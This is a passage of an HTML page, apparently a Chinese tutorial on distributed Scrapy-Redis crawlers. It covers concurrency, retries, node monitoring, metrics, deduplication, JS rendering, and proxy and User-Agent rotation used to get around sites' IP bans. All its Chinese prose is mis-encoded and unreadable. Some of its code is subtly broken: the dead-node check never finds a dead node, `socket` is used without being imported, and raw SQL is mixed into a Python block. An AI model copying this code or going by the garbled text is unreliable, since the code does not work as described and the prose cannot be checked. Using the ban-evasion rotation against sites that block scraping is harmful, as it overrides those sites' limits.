        <li><strong>ä»»åŠ¡é˜Ÿåˆ—</strong>ï¼šRedisï¼ˆå°è§„æ¨¡ï¼‰æˆ– Kafka/RabbitMQï¼ˆå¤§è§„æ¨¡ï¼‰</li>
        <li><strong>å»é‡å­˜å‚¨</strong>ï¼šRedis Bloom Filterï¼ˆå†…å­˜å……è¶³æ—¶ç”¨ Redis Setï¼‰</li>
        <li><strong>æ•°æ®å­˜å‚¨</strong>ï¼šMongoDBï¼ˆçµæ´»ï¼‰/ MySQLï¼ˆç»“æ„åŒ–ï¼‰/ Elasticsearchï¼ˆæœç´¢ï¼‰</li>
        <li><strong>ç›‘æ§</strong>ï¼šPrometheus + Grafana / ELK Stack</li>
        <li><strong>é…ç½®ç®¡ç†</strong>ï¼šConsul / etcd</li>
      </ul>

      <h3 id="2-æ€§èƒ½ä¼˜åŒ–">2. æ€§èƒ½ä¼˜åŒ–</h3>

      <p><strong>å¹¶å‘æ§åˆ¶ï¼š</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># settings.py</span>
<span class="n">CONCURRENT_REQUESTS</span> <span class="o">=</span> <span class="mi">100</span>              <span class="c1"># å…¨å±€å¹¶å‘</span>
<span class="n">CONCURRENT_REQUESTS_PER_DOMAIN</span> <span class="o">=</span> <span class="mi">16</span>    <span class="c1"># å•åŸŸåå¹¶å‘</span>
<span class="n">CONCURRENT_REQUESTS_PER_IP</span> <span class="o">=</span> <span class="mi">16</span>        <span class="c1"># å• IP å¹¶å‘</span>

<span class="c1"># ä¸‹è½½å»¶è¿Ÿ</span>
<span class="n">DOWNLOAD_DELAY</span> <span class="o">=</span> <span class="mf">0.25</span>
<span class="n">RANDOMIZE_DOWNLOAD_DELAY</span> <span class="o">=</span> <span class="kc">True</span>

<span class="c1"># å¯ç”¨è‡ªåŠ¨é™é€Ÿ</span>
<span class="n">AUTOTHROTTLE_ENABLED</span> <span class="o">=</span> <span class="kc">True</span>
<span class="n">AUTOTHROTTLE_START_DELAY</span> <span class="o">=</span> <span class="mf">0.5</span>
<span class="n">AUTOTHROTTLE_MAX_DELAY</span> <span class="o">=</span> <span class="mi">10</span>
<span class="n">AUTOTHROTTLE_TARGET_CONCURRENCY</span> <span class="o">=</span> <span class="mi">100</span>
</code></pre>
      </div>

      <p><strong>è¿æ¥æ± ä¼˜åŒ–ï¼š</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># å¢åŠ  Redis è¿æ¥æ± å¤§å°</span>
<span class="n">REDIS_PARAMS</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s1">&#39;socket_keepalive&#39;</span><span class="p">:</span> <span class="kc">True</span><span class="p">,</span>
    <span class="s1">&#39;socket_keepalive_options&#39;</span><span class="p">:</span> <span class="p">{</span>
        <span class="n">socket</span><span class="o">.</span><span class="n">TCP_KEEPIDLE</span><span class="p">:</span> <span class="mi">60</span><span class="p">,</span>
        <span class="n">socket</span><span class="o">.</span><span class="n">TCP_KEEPINTVL</span><span class="p">:</span> <span class="mi">10</span><span class="p">,</span>
        <span class="n">socket</span><span class="o">.</span><span class="n">TCP_KEEPCNT</span><span class="p">:</span> <span class="mi">3</span><span class="p">,</span>
    <span class="p">},</span>
    <span class="s1">&#39;health_check_interval&#39;</span><span class="p">:</span> <span class="mi">30</span><span class="p">,</span>
    <span class="s1">&#39;max_connections&#39;</span><span class="p">:</span> <span class="mi">100</span><span class="p">,</span>
<span class="p">}</span>
</code></pre>
      </div>

      <h3 id="3-å®¹é”™å¤„ç†">3. å®¹é”™å¤„ç†</h3>

      <p><strong>è¯·æ±‚é‡è¯•ï¼š</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># settings.py</span>
<span class="n">RETRY_ENABLED</span> <span class="o">=</span> <span class="kc">True</span>
<span class="n">RETRY_TIMES</span> <span class="o">=</span> <span class="mi">3</span>
<span class="n">RETRY_HTTP_CODES</span> <span class="o">=</span> <span class="p">[</span><span class="mi">500</span><span class="p">,</span> <span class="mi">502</span><span class="p">,</span> <span class="mi">503</span><span class="p">,</span> <span class="mi">504</span><span class="p">,</span> <span class="mi">408</span><span class="p">,</span> <span class="mi">429</span><span class="p">]</span>
</code></pre>
      </div>

      <p><strong>èŠ‚ç‚¹ç›‘æ§å’Œè‡ªåŠ¨æ¢å¤ï¼š</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">redis</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">time</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">datetime</span><span class="w"> </span><span class="kn">import</span> <span class="n">datetime</span>

<span class="k">class</span><span class="w"> </span><span class="nc">NodeMonitor</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">r</span> <span class="o">=</span> <span class="n">redis</span><span class="o">.</span><span class="n">Redis</span><span class="p">()</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">node_id</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">gethostname</span><span class="p">()</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">register_node</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æ³¨å†ŒèŠ‚ç‚¹&quot;&quot;&quot;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">r</span><span class="o">.</span><span class="n">setex</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;node:</span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">node_id</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">,</span> <span class="mi">60</span><span class="p">,</span> <span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">()</span><span class="o">.</span><span class="n">isoformat</span><span class="p">())</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">heartbeat</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;å®šæœŸå‘é€å¿ƒè·³&quot;&quot;&quot;</span>
        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
            <span class="k">try</span><span class="p">:</span>
                <span class="bp">self</span><span class="o">.</span><span class="n">register_node</span><span class="p">()</span>
                <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">30</span><span class="p">)</span>
            <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Heartbeat failed: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
                <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">check_dead_nodes</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æ£€æŸ¥å¤±æ•ˆèŠ‚ç‚¹&quot;&quot;&quot;</span>
        <span class="k">for</span> <span class="n">key</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">r</span><span class="o">.</span><span class="n">scan_iter</span><span class="p">(</span><span class="s1">&#39;node:*&#39;</span><span class="p">):</span>
            <span class="k">if</span> <span class="ow">not</span> <span class="bp">self</span><span class="o">.</span><span class="n">r</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">key</span><span class="p">):</span>
                <span class="n">node_id</span> <span class="o">=</span> <span class="n">key</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Node </span><span class="si">{</span><span class="n">node_id</span><span class="si">}</span><span class="s2"> is dead&quot;</span><span class="p">)</span>
                <span class="c1"># é‡æ–°åˆ†é…è¯¥èŠ‚ç‚¹çš„ä»»åŠ¡</span>
                <span class="bp">self</span><span class="o">.</span><span class="n">redistribute_tasks</span><span class="p">(</span><span class="n">node_id</span><span class="p">)</span>
</code></pre>
      </div>

      <h3 id="4-å®‰å…¨å’Œåˆè§„">4. å®‰å…¨å’Œåˆè§„</h3>

      <p><strong>IP è½®æ¢ï¼š</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># settings.py</span>
<span class="n">DOWNLOADER_MIDDLEWARES</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s1">&#39;crawler.middlewares.ProxyMiddleware&#39;</span><span class="p">:</span> <span class="mi">100</span><span class="p">,</span>
<span class="p">}</span>

<span class="c1"># ä»£ç†æ± é…ç½®</span>
<span class="n">PROXY_POOL_URL</span> <span class="o">=</span> <span class="s1">&#39;http://proxy-pool.example.com/get&#39;</span>
</code></pre>
      </div>

      <p><strong>User-Agent è½®æ¢ï¼š</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># middlewares.py</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">scrapy.downloadermiddlewares.useragent</span><span class="w"> </span><span class="kn">import</span> <span class="n">UserAgentMiddleware</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">random</span>

<span class="k">class</span><span class="w"> </span><span class="nc">RandomUserAgentMiddleware</span><span class="p">(</span><span class="n">UserAgentMiddleware</span><span class="p">):</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">user_agent</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">user_agents</span> <span class="o">=</span> <span class="p">[</span>
            <span class="s1">&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64)...&#39;</span><span class="p">,</span>
            <span class="s1">&#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)...&#39;</span><span class="p">,</span>
            <span class="s1">&#39;Mozilla/5.0 (X11; Linux x86_64)...&#39;</span><span class="p">,</span>
        <span class="p">]</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">process_request</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">spider</span><span class="p">):</span>
        <span class="n">request</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">&#39;User-Agent&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">user_agents</span><span class="p">)</span>
</code></pre>
      </div>

      <p><strong>è¯·æ±‚é¢‘ç‡é™åˆ¶ï¼š</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># settings.py</span>
<span class="n">DOWNLOAD_DELAY</span> <span class="o">=</span> <span class="mi">1</span>
<span class="n">AUTOTHROTTLE_ENABLED</span> <span class="o">=</span> <span class="kc">True</span>
<span class="n">AUTOTHROTTLE_TARGET_CONCURRENCY</span> <span class="o">=</span> <span class="mf">2.0</span>

<span class="c1"># ä½¿ç”¨ä»¤ç‰Œæ¡¶é™æµ</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">scrapy.extensions.throttle</span><span class="w"> </span><span class="kn">import</span> <span class="n">AutoThrottle</span>
</code></pre>
      </div>

      <h3 id="5-ç›‘æ§å’Œæ—¥å¿—">5. ç›‘æ§å’Œæ—¥å¿—</h3>

      <p><strong>Prometheus æŒ‡æ ‡é‡‡é›†ï¼š</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">prometheus_client</span><span class="w"> </span><span class="kn">import</span> <span class="n">Counter</span><span class="p">,</span> <span class="n">Histogram</span><span class="p">,</span> <span class="n">Gauge</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">time</span>

<span class="c1"># å®šä¹‰æŒ‡æ ‡</span>
<span class="n">requests_total</span> <span class="o">=</span> <span class="n">Counter</span><span class="p">(</span><span class="s1">&#39;crawler_requests_total&#39;</span><span class="p">,</span> <span class="s1">&#39;Total requests&#39;</span><span class="p">,</span> <span class="p">[</span><span class="s1">&#39;spider&#39;</span><span class="p">,</span> <span class="s1">&#39;status&#39;</span><span class="p">])</span>
<span class="n">request_duration</span> <span class="o">=</span> <span class="n">Histogram</span><span class="p">(</span><span class="s1">&#39;crawler_request_duration_seconds&#39;</span><span class="p">,</span> <span class="s1">&#39;Request duration&#39;</span><span class="p">)</span>
<span class="n">queue_size</span> <span class="o">=</span> <span class="n">Gauge</span><span class="p">(</span><span class="s1">&#39;crawler_queue_size&#39;</span><span class="p">,</span> <span class="s1">&#39;Queue size&#39;</span><span class="p">,</span> <span class="p">[</span><span class="s1">&#39;spider&#39;</span><span class="p">])</span>

<span class="k">class</span><span class="w"> </span><span class="nc">MetricsMiddleware</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="nf">process_request</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">spider</span><span class="p">):</span>
        <span class="n">request</span><span class="o">.</span><span class="n">meta</span><span class="p">[</span><span class="s1">&#39;start_time&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">process_response</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">response</span><span class="p">,</span> <span class="n">spider</span><span class="p">):</span>
        <span class="n">duration</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">request</span><span class="o">.</span><span class="n">meta</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;start_time&#39;</span><span class="p">,</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span>
        <span class="n">request_duration</span><span class="o">.</span><span class="n">observe</span><span class="p">(</span><span class="n">duration</span><span class="p">)</span>
        <span class="n">requests_total</span><span class="o">.</span><span class="n">labels</span><span class="p">(</span><span class="n">spider</span><span class="o">=</span><span class="n">spider</span><span class="o">.</span><span class="n">name</span><span class="p">,</span> <span class="n">status</span><span class="o">=</span><span class="n">response</span><span class="o">.</span><span class="n">status</span><span class="p">)</span><span class="o">.</span><span class="n">inc</span><span class="p">()</span>
        <span class="k">return</span> <span class="n">response</span>
</code></pre>
      </div>

      <hr />

      <h2 id="å¸¸è§é—®é¢˜">å¸¸è§é—®é¢˜</h2>

      <h3 id="q-åˆ†å¸ƒå¼çˆ¬è™«å¦‚ä½•ä¿è¯æ•°æ®ä¸é‡å¤">Q: åˆ†å¸ƒå¼çˆ¬è™«å¦‚ä½•ä¿è¯æ•°æ®ä¸é‡å¤ï¼Ÿ</h3>

      <p><strong>A</strong>: ä¸»è¦é€šè¿‡ä»¥ä¸‹å‡ ç§æ–¹å¼ï¼š</p>

      <ol>
        <li><strong>URL å»é‡</strong>ï¼šä½¿ç”¨ Redis Set æˆ– Bloom Filter è®°å½•å·²çˆ¬å–çš„ URL</li>
        <li><strong>æ•°æ®å»é‡</strong>ï¼šåœ¨å­˜å‚¨æ—¶ä½¿ç”¨å”¯ä¸€ç´¢å¼•ï¼ˆå¦‚ URLï¼‰è¿›è¡Œ upsert æ“ä½œ</li>
        <li><strong>åˆ†å¸ƒå¼é”</strong>ï¼šå¯¹äºéœ€è¦åŸå­æ“ä½œçš„åœºæ™¯ï¼Œä½¿ç”¨ Redis åˆ†å¸ƒå¼é”</li>
      </ol>

      <p>ç¤ºä¾‹ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># MongoDB ä½¿ç”¨å”¯ä¸€ç´¢å¼•</span>
<span class="n">collection</span><span class="o">.</span><span class="n">create_index</span><span class="p">(</span><span class="s1">&#39;url&#39;</span><span class="p">,</span> <span class="n">unique</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
<span class="n">collection</span><span class="o">.</span><span class="n">update_one</span><span class="p">({</span><span class="s1">&#39;url&#39;</span><span class="p">:</span> <span class="n">url</span><span class="p">},</span> <span class="p">{</span><span class="s1">&#39;$set&#39;</span><span class="p">:</span> <span class="n">data</span><span class="p">},</span> <span class="n">upsert</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>

<span class="c1"># MySQL ä½¿ç”¨ ON DUPLICATE KEY UPDATE</span>
<span class="n">INSERT</span> <span class="n">INTO</span> <span class="n">news</span> <span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">title</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>
<span class="n">VALUES</span> <span class="p">(</span><span class="o">%</span><span class="n">s</span><span class="p">,</span> <span class="o">%</span><span class="n">s</span><span class="p">,</span> <span class="o">%</span><span class="n">s</span><span class="p">)</span>
<span class="n">ON</span> <span class="n">DUPLICATE</span> <span class="n">KEY</span> <span class="n">UPDATE</span> <span class="n">title</span><span class="o">=%</span><span class="n">s</span><span class="p">,</span> <span class="n">content</span><span class="o">=%</span><span class="n">s</span>
</code></pre>
      </div>

      <h3 id="q-å¦‚ä½•å¤„ç†åŠ¨æ€-ip-å°ç¦">Q: å¦‚ä½•å¤„ç†åŠ¨æ€ IP å°ç¦ï¼Ÿ</h3>

      <p><strong>A</strong>:</p>

      <ol>
        <li><strong>ä»£ç†æ± </strong>ï¼šç»´æŠ¤å¤§é‡ä»£ç† IPï¼ŒåŠ¨æ€è½®æ¢</li>
        <li><strong>IP æ± æ£€æµ‹</strong>ï¼šå®šæœŸæ£€æµ‹ä»£ç†å¯ç”¨æ€§ï¼Œå‰”é™¤å¤±æ•ˆä»£ç†</li>
        <li><strong>æ™ºèƒ½é‡è¯•</strong>ï¼šè¯·æ±‚å¤±è´¥æ—¶æ›´æ¢ä»£ç†é‡è¯•</li>
        <li><strong>é™é€Ÿç­–ç•¥</strong>ï¼šæ£€æµ‹åˆ°å°ç¦æ—¶è‡ªåŠ¨é™ä½è¯·æ±‚é¢‘ç‡</li>
      </ol>

      <div class="codehilite">
        <pre><span></span><code><span class="k">class</span><span class="w"> </span><span class="nc">ProxyMiddleware</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">proxy_pool</span> <span class="o">=</span> <span class="n">ProxyPool</span><span class="p">()</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">process_request</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">spider</span><span class="p">):</span>
        <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">meta</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;retry_times&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
            <span class="c1"># é‡è¯•æ—¶æ›´æ¢ä»£ç†</span>
            <span class="n">proxy</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">proxy_pool</span><span class="o">.</span><span class="n">get_proxy</span><span class="p">()</span>
            <span class="n">request</span><span class="o">.</span><span class="n">meta</span><span class="p">[</span><span class="s1">&#39;proxy&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">proxy</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">process_exception</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">exception</span><span class="p">,</span> <span class="n">spider</span><span class="p">):</span>
        <span class="c1"># ä»£ç†å¤±è´¥ï¼Œæ ‡è®°ä¸ºä¸å¯ç”¨</span>
        <span class="n">proxy</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">meta</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;proxy&#39;</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">proxy</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">proxy_pool</span><span class="o">.</span><span class="n">mark_invalid</span><span class="p">(</span><span class="n">proxy</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">request</span>  <span class="c1"># é‡æ–°è°ƒåº¦è¯·æ±‚</span>
</code></pre>
      </div>

      <h3 id="q-å¦‚ä½•ç›‘æ§çˆ¬è™«è¿è¡ŒçŠ¶æ€">Q: å¦‚ä½•ç›‘æ§çˆ¬è™«è¿è¡ŒçŠ¶æ€ï¼Ÿ</h3>

      <p><strong>A</strong>:</p>

      <ol>
        <li>
          <p><strong>å®æ—¶æŒ‡æ ‡</strong>ï¼š</p>

          <ul>
            <li>çˆ¬å–é€Ÿåº¦ï¼ˆrequests/ç§’ï¼‰</li>
            <li>æˆåŠŸç‡</li>
            <li>é˜Ÿåˆ—é•¿åº¦</li>
            <li>å»é‡é›†åˆå¤§å°</li>
            <li>èŠ‚ç‚¹å­˜æ´»æ•°é‡</li>
          </ul>
        </li>
        <li>
          <p><strong>ç›‘æ§å·¥å…·</strong>ï¼š</p>

          <ul>
            <li><strong>Scrapy Stats</strong>ï¼šScrapy å†…ç½®ç»Ÿè®¡</li>
            <li><strong>Flower</strong>ï¼šCelery ä»»åŠ¡ç›‘æ§</li>
            <li><strong>Prometheus + Grafana</strong>ï¼šè‡ªå®šä¹‰æŒ‡æ ‡å¯è§†åŒ–</li>
            <li><strong>Redis Monitor</strong>ï¼šRedis æ€§èƒ½ç›‘æ§</li>
          </ul>
        </li>
        <li>
          <p><strong>å‘Šè­¦ç­–ç•¥</strong>ï¼š</p>

          <ul>
            <li>çˆ¬å–é€Ÿåº¦å¼‚å¸¸</li>
            <li>é”™è¯¯ç‡è¶…è¿‡é˜ˆå€¼</li>
            <li>é˜Ÿåˆ—ç§¯å‹ä¸¥é‡</li>
            <li>èŠ‚ç‚¹æ‰çº¿</li>
          </ul>
        </li>
      </ol>

      <h3 id="q-åˆ†å¸ƒå¼çˆ¬è™«çš„æˆæœ¬å¦‚ä½•æ§åˆ¶">Q: åˆ†å¸ƒå¼çˆ¬è™«çš„æˆæœ¬å¦‚ä½•æ§åˆ¶ï¼Ÿ</h3>

      <p><strong>A</strong>:</p>

      <ol>
        <li>
          <p><strong>èµ„æºä¼˜åŒ–</strong>ï¼š</p>

          <ul>
            <li>ä½¿ç”¨ Bloom Filter å‡å°‘å†…å­˜å ç”¨</li>
            <li>åˆç†é…ç½®å¹¶å‘æ•°ï¼Œé¿å…è¿‡åº¦æ¶ˆè€—å¸¦å®½</li>
            <li>ä½¿ç”¨å¯¹è±¡å­˜å‚¨ï¼ˆOSSï¼‰å­˜å‚¨å›¾ç‰‡ç­‰å¤§æ–‡ä»¶</li>
          </ul>
        </li>
        <li>
          <p><strong>æˆæœ¬ä¼°ç®—</strong>ï¼š</p>

          <ul>
            <li><strong>Redis å†…å­˜</strong>ï¼š1 äº¿ URL ä½¿ç”¨ Bloom Filter çº¦ 128 MB</li>
            <li><strong>å¸¦å®½</strong>ï¼šå‡è®¾æ¯é¡µ 100 KBï¼Œ1000 é¡µ/ç§’ = 100 MB/ç§’</li>
            <li><strong>å­˜å‚¨</strong>ï¼šMongoDB æˆ– Elasticsearchï¼ŒæŒ‰å®é™…æ•°æ®é‡è®¡ç®—</li>
          </ul>
        </li>
        <li>
          <p><strong>å¼¹æ€§ä¼¸ç¼©</strong>ï¼š</p>

          <ul>
            <li>æ ¹æ®ä»»åŠ¡é‡åŠ¨æ€å¢å‡çˆ¬è™«èŠ‚ç‚¹</li>
            <li>ä½¿ç”¨ Kubernetes æˆ– Docker Swarm è‡ªåŠ¨è°ƒåº¦</li>
            <li>éé«˜å³°æœŸé™ä½èµ„æºä½¿ç”¨</li>
          </ul>
        </li>
      </ol>

      <h3 id="q-å¦‚ä½•å¤„ç†-javascript-æ¸²æŸ“çš„ç½‘é¡µ">Q: å¦‚ä½•å¤„ç† JavaScript æ¸²æŸ“çš„ç½‘é¡µï¼Ÿ</h3>

      <p><strong>A</strong>:</p>

      <ol>
        <li>
          <p><strong>Selenium/Puppeteer é›†ç¾¤</strong>ï¼š</p>

          <ul>
            <li>ä½¿ç”¨ Selenium Grid æˆ– Browserless æ­å»ºæµè§ˆå™¨é›†ç¾¤</li>
            <li>é€šè¿‡ Celery åˆ†å‘æ¸²æŸ“ä»»åŠ¡</li>
          </ul>
        </li>
        <li>
          <p><strong>Scrapy-Splash</strong>ï¼š</p>

          <ul>
            <li>Splash æ˜¯è½»é‡çº§çš„ JavaScript æ¸²æŸ“æœåŠ¡</li>
            <li>æ”¯æŒåˆ†å¸ƒå¼éƒ¨ç½²</li>
          </ul>
        </li>
      </ol>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># settings.py</span>
<span class="n">SPLASH_URL</span> <span class="o">=</span> <span class="s1">&#39;http://splash:8050&#39;</span>
<span class="n">DOWNLOADER_MIDDLEWARES</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s1">&#39;scrapy_splash.SplashCookiesMiddleware&#39;</span><span class="p">:</span> <span class="mi">723</span><span class="p">,</span>
    <span class="s1">&#39;scrapy_splash.SplashMiddleware&#39;</span><span class="p">:</span> <span class="mi">725</span><span class="p">,</span>
<span class="p">}</span>

<span class="c1"># spider</span>
<span class="k">yield</span> <span class="n">SplashRequest</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">parse</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;wait&#39;</span><span class="p">:</span> <span class="mi">3</span><span class="p">})</span>
</code></pre>
      </div>

      <ol start="3">
        <li><strong>é¢„æ¸²æŸ“æœåŠ¡</strong>ï¼š
          <ul>
            <li>ä½¿ç”¨ Prerender.io ç­‰ç¬¬ä¸‰æ–¹æœåŠ¡</li>
            <li>è‡ªå»º Headless Chrome é›†ç¾¤</li>
          </ul>
        </li>
      </ol>

      <hr />

      <h2 id="è¿›é˜¶é˜…è¯»">è¿›é˜¶é˜…è¯»</h2>

      <h3 id="å®˜æ–¹æ–‡æ¡£">å®˜æ–¹æ–‡æ¡£</h3>

      <ul>
        <li><a href="https://docs.scrapy.org/">Scrapy å®˜æ–¹æ–‡æ¡£</a></li>
        <li><a href="https://scrapy-redis.readthedocs.io/">Scrapy-Redis æ–‡æ¡£</a></li>
        <li><a href="https://docs.celeryproject.org/">Celery å®˜æ–¹æ–‡æ¡£</a></li>
      </ul>

      <h3 id="æŠ€æœ¯åšå®¢">æŠ€æœ¯åšå®¢</h3>

      <ul>
        <li><a href="https://bbs.huaweicloud.com/blogs/746d061b414d462b892aa9e80629e380">æ„å»ºé«˜æ•ˆçš„åˆ†å¸ƒå¼çˆ¬è™«ç³»ç»Ÿ - åä¸ºäº‘</a></li>
        <li><a href="https://blog.csdn.net/weixin_52392194/article/details/141000827">åƒä¸‡çº§åˆ†å¸ƒå¼çˆ¬è™«ï¼šScrapy-Redis æ·±å…¥è§£æ</a>
        </li>
        <li><a href="https://blog.csdn.net/nicajonh/article/details/79918176">Scrapy-Redis ä¸ Celery æ„å»ºåˆ†å¸ƒå¼çˆ¬è™«</a></li>
        <li><a href="https://bbs.songma.com/255362.html">Python å¤§è§„æ¨¡æ•°æ®æŠ“å–å®æˆ˜ï¼šäº¿çº§æ•°æ®å»é‡</a></li>
        <li><a href="https://blog.csdn.net/qq_41768400/article/details/80976119">åˆ†å¸ƒå¼çˆ¬è™«åŠ Bloom Filter å»é‡</a></li>
        <li><a href="https://blog.csdn.net/gitblog_00030/article/details/137066743">Scrapy Redis BloomFilter: æå‡æŠ“å–æ•ˆç‡</a>
        </li>
        <li><a href="https://blog.csdn.net/gitblog_00021/article/details/139407129">æ¨èä½¿ç”¨ï¼šScrapy-Redis-BloomFilter
            å»é‡åˆ©å™¨</a></li>
      </ul>

      <h3 id="å¼€æºé¡¹ç›®">å¼€æºé¡¹ç›®</h3>

      <ul>
        <li><a href="https://github.com/scrapy/scrapy">Scrapy</a></li>
        <li><a href="https://github.com/rmax/scrapy-redis">Scrapy-Redis</a></li>
        <li><a href="https://github.com/Python3WebSpider/ScrapyRedisBloomFilter">Scrapy-Redis-BloomFilter</a></li>
        <li><a href="https://github.com/binux/pyspider">PySpider</a></li>
        <li><a href="https://github.com/celery/celery">Celery</a></li>
      </ul>

      <h3 id="è®ºæ–‡å’Œç ”ç©¶">è®ºæ–‡å’Œç ”ç©¶</h3>

      <ul>
        <li><a href="https://dl.acm.org/doi/10.1145/3184558.3191623">Large-Scale Web Crawling</a></li>
        <li><a href="https://arxiv.org/abs/1804.04251">Bloom Filters in Distributed Systems</a></li>
      </ul>

      <hr />

      <h2 id="ç›¸å…³ç« èŠ‚">ç›¸å…³ç« èŠ‚</h2>

      <ul>
        <li><a href="#06-Engineering-proxy-pool-management">ä»£ç†æ± ç®¡ç†</a> - åˆ†å¸ƒå¼çˆ¬è™«çš„ IP ç®¡ç†</li>
        <li><a href="#06-Engineering-data-storage-solutions">æ•°æ®å­˜å‚¨æ–¹æ¡ˆ</a> - çˆ¬å–æ•°æ®çš„å­˜å‚¨ç­–ç•¥</li>
        <li><a href="#06-Engineering-message-queue-application">æ¶ˆæ¯é˜Ÿåˆ—åº”ç”¨</a> - ä»»åŠ¡é˜Ÿåˆ—çš„æ·±å…¥åº”ç”¨</li>
